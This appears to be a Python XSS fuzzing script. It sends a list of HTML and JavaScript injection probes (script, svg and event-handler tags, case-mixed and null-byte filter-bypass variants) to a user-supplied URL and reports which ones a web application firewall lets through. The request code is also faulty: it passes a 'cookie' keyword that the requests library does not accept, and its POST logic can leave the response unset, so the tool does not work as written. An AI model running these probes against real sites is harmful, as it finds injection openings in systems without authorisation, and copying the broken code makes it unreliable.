import sys
import requests
from prettytable import PrettyTable
from urllib.parse import quote_plus
from time import sleep

green = '\033[92m'
red = '\033[91m'
yellow = '\033[93m'
end = '\033[0m'

url = cookie = method = post_data = ""

try:
    url = input('input url:')
    cookie = input('input cookie:')
    method = input('Does it use POST method? [Y/n]')
    if method == 'Y':
        post_data = input('input post data:')
except:
    print('sr error!')
    pass

fuzzes = ['<test', '<test//', '<test>', '<test x>', '<test x=y', '<test x=y//', '<test/oNxy=xxx//', '<test oNxX=yYy>', '<test onload=x', '<test/o%00nload=x', '<test sRc=xxx', '<test data=asa', '<test data=javaSrIpt:asa', '<svg x=y>', '<details x=y//', '<a href=x//', '<emBed x=y>','<object x=y//', '<bGsOund sRc=x>', '<iSinDEx x=y//', '<aUdio x=y>', '<sCriPt x=y>', '<scrIpT//src=//', '">payload<br/attr="', '"-confirm``-"', '<test ONdBlcLick=x>', '<test/oNcoNteXtMenu=x>', '<test OndRAgOvEr=x>']

fuzzes_id = 0
result = []
for i in fuzzes:
    fuzzes_id = fuzzes_id + 1
    sleep(1)
    fuzzy = quote_plus(i)
    print("%stest fuzz:%s%s" % (yellow, end, fuzzy))
    try:
        if method == 'n':
            if cookie == "":
                r = requests.get(url + fuzzy, timeout=10)
            else:
                r = requests.get(url + fuzzy, timeout=10, cookie=cookie)
        else:
            if cookie == "":
                cookie = input("Plesae input cookie:")
                if cookie != "":
                    r = requests.post(url, data=fuzzy, timeout=10,cookie=cookie)
        response = r.text
    except:
        print('%sWAF is dropping suspicious.%s\n' % (red, end))
        pass
    try:
        if i in response:
            result.append({
                'result':'%sWork%s'%(green, end),
                'fuzz':i})
        elif str(r.status_code)[:1] != '2':
            result.append({
                'result':'%sBlocked%s'%(yellow, end),
                'fuzz':i})
        else:
            result.append({
                'result':'%sFiltered%s'%(red, end),
                'fuzz':i})
    except:
        pass
table = PrettyTable(['Fuzz', 'Response'])
for value in result:
    table.add_row([value['fuzz'], value['result']])
print(table)
